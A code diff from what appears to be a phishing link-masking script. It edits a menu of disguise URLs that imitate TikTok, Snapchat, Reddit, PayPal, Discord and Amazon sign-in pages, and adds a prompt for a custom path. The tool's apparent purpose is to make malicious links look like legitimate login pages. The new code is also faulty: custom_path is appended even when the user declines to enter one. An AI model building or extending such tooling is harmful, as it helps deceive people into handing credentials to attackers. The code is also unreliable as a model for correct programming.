@@ -87,9 +87,9 @@ if mask_url_choice == '1':
     print("Choose from:\n1. TikTok Video\n2. TikTok Account\n3. Snapchat Account\n4. Snapchat Reel\n5. Youtube Video (Youtu.be)\n6. Youtube Video (Youtube.com)\n7. Youtube Short")
     social_media_choice = input()
     if social_media_choice == '1':
-        MaskURL = "https://vm.tiktok.com/"
+        MaskURL = "https://vm.tiktok.com/account"
     elif social_media_choice == '2':
-        MaskURL = "https://www.tiktok.com"
+        MaskURL = "https://www.tiktok.com/"
     elif social_media_choice == '3':
         MaskURL = "https://t.snapchat.com/add/"
     elif social_media_choice == '4':
@@ -136,11 +136,11 @@ elif mask_url_choice == '3':
     elif login_service_choice == '8':
         MaskURL = "https://m.youtube.com/?login/"
     elif login_service_choice == '9':
-        MaskURL = "https://www.reddit.com/login/?"
+        MaskURL = "https://www.reddit.com/login/"
     elif login_service_choice == '10':
         MaskURL = "https://accounts.spotify.com/en/login/"
     elif login_service_choice == '11':
-        MaskURL = "https://www.paypal.com/signin"
+        MaskURL = "https://www.paypal.com/signin/"
     elif login_service_choice == '12':
         MaskURL = "https://discord.com/login/"
     elif login_service_choice == '13':
@@ -155,6 +155,12 @@ elif mask_url_choice == '3':
         MaskURL = "https://www.amazon.co.uk/signin/"
     else:
         print("Invalid choice")
+
+custom_path_choice = input("Do you want to add a custom path to the Login URL? (y/n): ")
+if custom_path_choice.lower() == 'y':
+  custom_path = input("Enter the custom path: ")
+MaskURL += custom_path
+
 # Process MaskURL
 ReplacedMaskURL = process_mask_url(MaskURL)
 
